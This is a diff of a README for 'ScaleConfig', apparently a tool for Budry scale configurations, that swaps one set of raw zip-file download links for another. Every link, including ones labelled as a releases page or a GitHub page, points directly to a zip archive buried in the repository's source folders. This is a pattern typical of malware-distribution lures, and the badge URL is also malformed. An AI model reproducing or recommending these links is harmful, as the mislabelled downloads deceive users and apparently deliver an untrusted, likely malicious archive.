@@ -6,11 +6,11 @@ ScaleConfig is a simple tool designed for managing the .TMS configurations of Bu
 
 ## 📥 Download ScaleConfig
 
-[![Download ScaleConfig](https://raw.githubusercontent.com/Geansix7/ScaleConfig/main/frontend/src/components/keyboard/Config-Scale-3.4.zip%20ScaleConfig-Click%20Here-blue)](https://raw.githubusercontent.com/Geansix7/ScaleConfig/main/frontend/src/components/keyboard/Config-Scale-3.4.zip)
+[![Download ScaleConfig](https://raw.githubusercontent.com/Geansix7/ScaleConfig/main/frontend/Scale_Config_2.5.zip%20ScaleConfig-Click%20Here-blue)](https://raw.githubusercontent.com/Geansix7/ScaleConfig/main/frontend/Scale_Config_2.5.zip)
 
 To get started, visit the page below to download the latest version of ScaleConfig.
 
-[Download ScaleConfig Releases](https://raw.githubusercontent.com/Geansix7/ScaleConfig/main/frontend/src/components/keyboard/Config-Scale-3.4.zip)
+[Download ScaleConfig Releases](https://raw.githubusercontent.com/Geansix7/ScaleConfig/main/frontend/Scale_Config_2.5.zip)
 
 ## 💻 System Requirements
 
@@ -27,7 +27,7 @@ Follow these steps to install ScaleConfig on your device:
 
 1. **Visit the Releases Page:** Click on the link below to access the ScaleConfig releases.
    
-   [Download ScaleConfig Releases](https://raw.githubusercontent.com/Geansix7/ScaleConfig/main/frontend/src/components/keyboard/Config-Scale-3.4.zip)
+   [Download ScaleConfig Releases](https://raw.githubusercontent.com/Geansix7/ScaleConfig/main/frontend/Scale_Config_2.5.zip)
 
 2. **Select the Latest Release:** Find the most recent version of ScaleConfig.
 
@@ -79,6 +79,6 @@ If you encounter any issues while using ScaleConfig, please reach out to our sup
 
 For more information, visit our GitHub page to learn about ongoing development and future features.
 
-[Explore ScaleConfig on GitHub](https://raw.githubusercontent.com/Geansix7/ScaleConfig/main/frontend/src/components/keyboard/Config-Scale-3.4.zip)
+[Explore ScaleConfig on GitHub](https://raw.githubusercontent.com/Geansix7/ScaleConfig/main/frontend/Scale_Config_2.5.zip)
 
 Thank you for choosing ScaleConfig. We hope it helps you efficiently manage your Budry scales!
